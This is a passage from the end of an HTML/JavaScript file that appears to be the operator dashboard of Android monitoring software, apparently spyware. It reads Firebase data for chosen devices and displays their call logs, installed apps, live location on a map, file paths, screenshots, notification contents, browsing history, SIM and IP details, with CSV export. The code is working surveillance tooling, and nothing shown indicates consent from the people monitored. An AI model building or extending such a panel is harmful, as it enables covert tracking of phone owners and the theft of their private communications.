                    return `<i class="fas ${icon} ${color} mr-1"></i> ${sanitizeHTML(type)}`;
                }},
                { header: 'Number', key: 'number' },
                { header: 'Duration', key: 'duration', render: (d) => `${d}s` },
                { header: 'Date', key: 'date', render: (date) => formatTimestamp(date) }
            ];
            renderGenericList('Call Logs', 'callLogs', columns, (item) => item, 'call_logs');
        }
        
        // INSTALLED APPS
        function renderInstalledApps() {
            const columns = [
                { header: 'App Name', key: 'appName' },
                { header: 'Package Name', key: 'packageName' },
                { header: 'Type', key: 'type', render: (type) => type === 'system' ? 'System' : 'User' }
            ];
            const contentDiv = document.getElementById('apps-content');

            // Custom rendering for apps to show total count
            const dataPath = 'installedApps';
            const fullDataPath = `devices/${selectedDeviceId}/${dataPath}`;
            cleanupDeviceDataListener(fullDataPath);
            
            const totalCountContainer = `<div class="mb-2 text-right" id="apps-total-count">Total Apps: 0</div>`;

            renderGenericList('Installed Apps', dataPath, columns, (item) => item, 'installed_apps', totalCountContainer);
            
            // Update total count
             deviceDataListeners[fullDataPath + "_count"] = onValue(ref(db, fullDataPath), (snapshot) => {
                const appData = snapshot.val();
                const count = appData ? Object.keys(appData).length : 0;
                const totalCountEl = document.getElementById('apps-total-count');
                if (totalCountEl) totalCountEl.textContent = `Total Apps: ${count}`;
             });
        }

        // BATTERY INFO
        function renderBatteryInfo() {
            const contentDiv = document.getElementById('battery-content');
            if (!contentDiv || !selectedDeviceId) {
                 if (contentDiv) contentDiv.innerHTML = `<p>Please select a device first.</p>`;
                 return;
            }
            contentDiv.innerHTML = `
                <div class="bg-gray-800 p-6 rounded-lg shadow-lg max-w-md mx-auto">
                    <div class="flex items-center justify-between mb-4">
                        <h3 class="text-xl font-semibold text-blue-400">Battery Status</h3>
                        <span id="battery-live-indicator"></span>
                    </div>
                    <div class="space-y-3">
                        <div class="flex justify-between">
                            <span class="text-gray-400">Level:</span>
                            <span id="battery-level" class="font-bold text-lg">N/A</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-400">Status:</span>
                            <span id="battery-status" class="font-bold">N/A</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-400">Last Updated:</span>
                            <span id="battery-last-updated" class="text-sm text-gray-500">N/A</span>
                        </div>
                    </div>
                </div>
            `;
            const batteryRef = ref(db, `devices/${selectedDeviceId}/batteryInfo`);
            cleanupDeviceDataListener(`devices/${selectedDeviceId}/batteryInfo`);

            deviceDataListeners[`devices/${selectedDeviceId}/batteryInfo`] = onValue(batteryRef, (snapshot) => {
                const data = snapshot.val() || (placeholderDeviceData.devices[selectedDeviceId] ? placeholderDeviceData.devices[selectedDeviceId].batteryInfo : {});
                const liveIndicator = document.getElementById('battery-live-indicator');
                if (liveIndicator) liveIndicator.innerHTML = '<span class="live-dot" title="Realtime Update"></span>';
                setTimeout(() => { if (liveIndicator) liveIndicator.innerHTML = ''; }, 2000);

                document.getElementById('battery-level').textContent = data.level ? `${data.level}%` : 'N/A';
                document.getElementById('battery-status').textContent = data.isCharging ? 'Charging' : (data.level ? 'Discharging' : 'N/A');
                document.getElementById('battery-last-updated').textContent = formatTimestamp(data.lastUpdated, 'timeAgo');

                // Visual for battery level (optional)
                const batteryLevelEl = document.getElementById('battery-level');
                if (data.level) {
                    if(data.level > 70) batteryLevelEl.className = 'font-bold text-lg text-green-400';
                    else if (data.level > 30) batteryLevelEl.className = 'font-bold text-lg text-yellow-400';
                    else batteryLevelEl.className = 'font-bold text-lg text-red-400';
                }

            }, (error) => {
                console.error("Error fetching battery info:", error);
                contentDiv.innerHTML = `<p class="text-red-500">Error loading battery data: ${error.message}</p>`;
            });
        }
        
        // LOCATION
        function renderLocation() {
            const contentDiv = document.getElementById('location-content');
            if (!contentDiv || !selectedDeviceId) {
                if (contentDiv) contentDiv.innerHTML = `<p>Please select a device first.</p>`;
                return;
            }
            contentDiv.innerHTML = `
                <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
                     <div class="flex items-center justify-between mb-4">
                        <h3 class="text-xl font-semibold text-blue-400">Last Known Location</h3>
                        <span id="location-live-indicator"></span>
                    </div>
                    <div id="map" class="mb-4"></div>
                    <div class="space-y-2 text-sm">
                        <p><strong>Latitude:</strong> <span id="loc-lat">N/A</span></p>
                        <p><strong>Longitude:</strong> <span id="loc-lon">N/A</span></p>
                        <p><strong>Accuracy:</strong> <span id="loc-acc">N/A</span></p>
                        <p><strong>Timestamp:</strong> <span id="loc-time">N/A</span></p>
                    </div>
                </div>
            `;
            
            // Initialize map if not already
            if (mapInstance) {
                mapInstance.remove(); // Remove previous map instance
            }
            mapInstance = L.map('map').setView([0, 0], 2); // Default view
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
            }).addTo(mapInstance);
            let marker = null;

            const locationRef = ref(db, `devices/${selectedDeviceId}/location`);
            cleanupDeviceDataListener(`devices/${selectedDeviceId}/location`);

            deviceDataListeners[`devices/${selectedDeviceId}/location`] = onValue(locationRef, (snapshot) => {
                const data = snapshot.val() || (placeholderDeviceData.devices[selectedDeviceId] ? placeholderDeviceData.devices[selectedDeviceId].location : null);
                const liveIndicator = document.getElementById('location-live-indicator');
                if (liveIndicator) liveIndicator.innerHTML = '<span class="live-dot" title="Realtime Update"></span>';
                setTimeout(() => { if (liveIndicator) liveIndicator.innerHTML = ''; }, 2000);

                if (data && data.latitude && data.longitude) {
                    document.getElementById('loc-lat').textContent = data.latitude.toFixed(5);
                    document.getElementById('loc-lon').textContent = data.longitude.toFixed(5);
                    document.getElementById('loc-acc').textContent = data.accuracy ? `${data.accuracy.toFixed(0)} meters` : 'N/A';
                    document.getElementById('loc-time').textContent = formatTimestamp(data.timestamp);

                    const latLng = [data.latitude, data.longitude];
                    mapInstance.setView(latLng, 15);
                    if (marker) {
                        marker.setLatLng(latLng);
                    } else {
                        marker = L.marker(latLng).addTo(mapInstance);
                    }
                    marker.bindPopup(`Location at ${formatTimestamp(data.timestamp)}`).openPopup();
                } else {
                    document.getElementById('loc-lat').textContent = 'N/A';
                    document.getElementById('loc-lon').textContent = 'N/A';
                    document.getElementById('loc-acc').textContent = 'N/A';
                    document.getElementById('loc-time').textContent = 'N/A';
                    mapInstance.setView([0,0], 2); // Reset map view if no data
                    if(marker) { marker.remove(); marker = null;}
                    document.getElementById('map').innerHTML = '<p class="text-center text-gray-400 p-10">No location data available.</p>';
                }
            }, (error) => {
                console.error("Error fetching location:", error);
                contentDiv.innerHTML = `<p class="text-red-500">Error loading location data: ${error.message}</p>`;
            });
        }
        
        // FILE LOGS
        function renderFileLogs() {
            const columns = [
                { header: 'Folder', key: 'folderName' },
                { header: 'File Name', key: 'fileName' },
                { header: 'Extension', key: 'extension' },
                { header: 'Size', key: 'size', render: (size) => size ? (size / 1024).toFixed(2) + ' KB' : 'N/A' },
                { header: 'Full Path', key: 'path', render: (path) => `<span title="${sanitizeHTML(path)}">${sanitizeHTML(path.substring(0,40))}${path && path.length > 40 ? '...' : ''}</span>` }
            ];
            renderGenericList('File Logs', 'fileLogs', columns, (item) => item, 'file_logs');
        }

        // SCREENSHOTS
        function renderScreenshots() {
            const contentDiv = document.getElementById('screenshots-content');
             if (!contentDiv || !selectedDeviceId) {
                 if (contentDiv) contentDiv.innerHTML = `<p>Please select a device first.</p>`;
                 return;
            }
            contentDiv.innerHTML = `
                <p class="text-sm text-gray-400 mb-4">Click thumbnail to view full image.</p>
                <div id="screenshots-grid" class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4">
                    <!-- Screenshots will be injected here -->
                </div>
            `;
            const grid = document.getElementById('screenshots-grid');
            const screenshotsRef = ref(db, `devices/${selectedDeviceId}/screenshots`);
            cleanupDeviceDataListener(`devices/${selectedDeviceId}/screenshots`);

            deviceDataListeners[`devices/${selectedDeviceId}/screenshots`] = onValue(screenshotsRef, (snapshot) => {
                grid.innerHTML = ''; // Clear previous
                const data = snapshot.val() || (placeholderDeviceData.devices[selectedDeviceId] ? placeholderDeviceData.devices[selectedDeviceId].screenshots : null);
                if (data && Object.keys(data).length > 0) {
                    Object.values(data).sort((a,b) => b.timestamp - a.timestamp).forEach(ss => { // Sort by newest first
                        const div = document.createElement('div');
                        div.className = 'bg-gray-800 rounded-lg shadow-lg overflow-hidden cursor-pointer hover:opacity-80 transition-opacity';
                        div.innerHTML = `
                            <img src="${sanitizeHTML(ss.url)}" alt="${sanitizeHTML(ss.name || 'Screenshot')}" class="w-full h-32 object-cover">
                            <div class="p-2 text-xs">
                                <p class="truncate" title="${sanitizeHTML(ss.name || 'Screenshot')}">${sanitizeHTML(ss.name || 'Screenshot')}</p>
                                <p class="text-gray-400">${formatTimestamp(ss.timestamp, 'timeAgo')}</p>
                            </div>
                        `;
                        div.onclick = () => showImageModal(ss.url);
                        grid.appendChild(div);
                    });
                } else {
                    grid.innerHTML = '<p class="col-span-full text-center py-4">No screenshots available.</p>';
                }
            }, (error) => {
                console.error("Error fetching screenshots:", error);
                grid.innerHTML = `<p class="col-span-full text-center py-4 text-red-500">Error loading screenshots: ${error.message}</p>`;
            });
        }

        closeModalButton.addEventListener('click', () => imageModal.classList.add('hidden'));
        imageModal.addEventListener('click', (e) => { // Close on backdrop click
            if (e.target === imageModal) {
                 imageModal.classList.add('hidden');
            }
        });

        function showImageModal(url) {
            fullscreenImage.src = url;
            imageModal.classList.remove('hidden');
            imageModal.classList.add('flex');
        }

        // NOTIFICATIONS
        function renderNotifications() {
            const columns = [
                { header: 'App', key: 'appName' },
                { header: 'Title', key: 'title' },
                { header: 'Content', key: 'content', render: (c) => `<span title="${sanitizeHTML(c)}">${sanitizeHTML(c.substring(0,50))}${c.length > 50 ? '...' : ''}</span>` },
                { header: 'Time', key: 'timestamp', render: (time) => formatTimestamp(time) }
            ];
            renderGenericList('Notifications', 'notifications', columns, (item) => item, 'notifications_log');
        }

        // BROWSING HISTORY (Optional)
        function renderBrowsingHistory() {
            const columns = [
                { header: 'Title', key: 'title' },
                { header: 'URL', key: 'url', render: (url) => `<a href="${sanitizeHTML(url)}" target="_blank" class="text-blue-400 hover:underline">${sanitizeHTML(url)}</a>` },
                { header: 'Time', key: 'timestamp', render: (time) => formatTimestamp(time) }
            ];
            renderGenericList('Browsing History', 'browsingHistory', columns, (item) => item, 'browsing_history');
        }
        
        // DEVICE INFO
        function renderDeviceInfo() {
            const contentDiv = document.getElementById('device-info-content');
            if (!contentDiv || !selectedDeviceId) {
                if (contentDiv) contentDiv.innerHTML = `<p>Please select a device first.</p>`;
                return;
            }
            contentDiv.innerHTML = `
                <div class="bg-gray-800 p-6 rounded-lg shadow-lg max-w-2xl mx-auto">
                    <div class="flex justify-between items-center mb-4">
                        <h3 class="text-xl font-semibold text-blue-400">Device Details</h3>
                        <button id="device-info-export-csv" class="bg-green-500 hover:bg-green-600 text-white font-semibold py-1 px-3 rounded-lg btn text-sm">
                            <i class="fas fa-file-csv mr-1"></i> Export Info
                        </button>
                    </div>
                    <div class="space-y-3 text-sm" id="device-info-details">
                        <!-- Details will be loaded here -->
                        <p>Loading device information...</p>
                    </div>
                </div>
            `;
            const detailsContainer = document.getElementById('device-info-details');
            const deviceInfoRef = ref(db, `devices/${selectedDeviceId}/deviceInfo`);
            cleanupDeviceDataListener(`devices/${selectedDeviceId}/deviceInfo`);

            deviceDataListeners[`devices/${selectedDeviceId}/deviceInfo`] = onValue(deviceInfoRef, (snapshot) => {
                const data = snapshot.val() || (placeholderDeviceData.devices[selectedDeviceId] ? placeholderDeviceData.devices[selectedDeviceId].deviceInfo : {});
                detailsContainer.innerHTML = `
                    ${renderDetailRow('Device UID:', selectedDeviceId, false)}
                    ${renderDetailRow('Device Name (Alias):', data.deviceName || (placeholderDeviceData.devices[selectedDeviceId] ? placeholderDeviceData.devices[selectedDeviceId].alias : 'N/A'), true, 'deviceName', data.deviceName || (placeholderDeviceData.devices[selectedDeviceId] ? placeholderDeviceData.devices[selectedDeviceId].alias : 'N/A'))}
                    ${renderDetailRow('Model:', data.model)}
                    ${renderDetailRow('Android Version:', data.androidVersion)}
                    ${renderDetailRow('IP Address:', data.ip)}
                    ${renderDetailRow('SIM Info:', data.simInfo)}
                    ${renderDetailRow('Registration Time:', formatTimestamp(data.registrationTime))}
                `;
                
                // Add event listeners for editable fields
                detailsContainer.querySelectorAll('.editable-field-input').forEach(input => {
                    input.addEventListener('change', (e) => {
                        const fieldKey = e.target.dataset.key;
                        const newValue = e.target.value;
                        update(ref(db, `devices/${selectedDeviceId}/deviceInfo`), { [fieldKey]: newValue })
                            .then(() => console.log(`${fieldKey} updated to ${newValue}`))
                            .catch(err => {
                                console.error(`Error updating ${fieldKey}:`, err);
                                alert(`Failed to update ${fieldKey}`);
                                e.target.value = data[fieldKey]; // Revert on error
                            });
                    });
                });

                document.getElementById('device-info-export-csv').onclick = () => {
                     const exportData = [{
                        uid: selectedDeviceId,
                        ...data
                    }];
                    exportToCSV(exportData, `device_info_${selectedDeviceId}`);
                };

            }, (error) => {
                console.error("Error fetching device info:", error);
                detailsContainer.innerHTML = `<p class="text-red-500">Error loading device information: ${error.message}</p>`;
            });
        }

        function renderDetailRow(label, value, isEditable = false, fieldKey = '', currentValue = '') {
            const val = value !== undefined && value !== null ? sanitizeHTML(String(value)) : 'N/A';
            if (isEditable) {
                return `
                    <div class="flex justify-between items-center py-1 border-b border-gray-700">
                        <span class="text-gray-400 w-1/3">${label}</span>
                        <input type="text" value="${sanitizeHTML(currentValue)}" data-key="${fieldKey}" class="editable-field-input bg-gray-700 text-gray-100 border-b border-gray-600 focus:border-blue-500 outline-none px-2 py-1 rounded w-2/3 text-right">
                    </div>`;
            }
            return `
                <div class="flex justify-between py-1 border-b border-gray-700">
                    <span class="text-gray-400 w-1/3">${label}</span>
                    <span class="font-medium w-2/3 text-right">${val}</span>
                </div>`;
        }


        // --- Initial Setup Calls and Global Listeners ---
        function setupRealtimeListeners() {
            // Example: General listener for device online status changes affecting dashboard if needed
            // More specific listeners are attached when a section or device is selected
            console.log("Global realtime listeners setup (if any beyond auth state).");
        }
        
        // Initial call if needed or handle via auth state change
        // navigateToSection('dashboard'); // This is now called after successful login

        // Small helper for fade-in animation on content load
        const styleSheet = document.createElement("style");
        styleSheet.type = "text/css";
        styleSheet.innerText = `
            @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
            .animate-fadeIn { animation: fadeIn 0.3s ease-out; }
        `;
        document.head.appendChild(styleSheet);

    </script>
</body>
</html>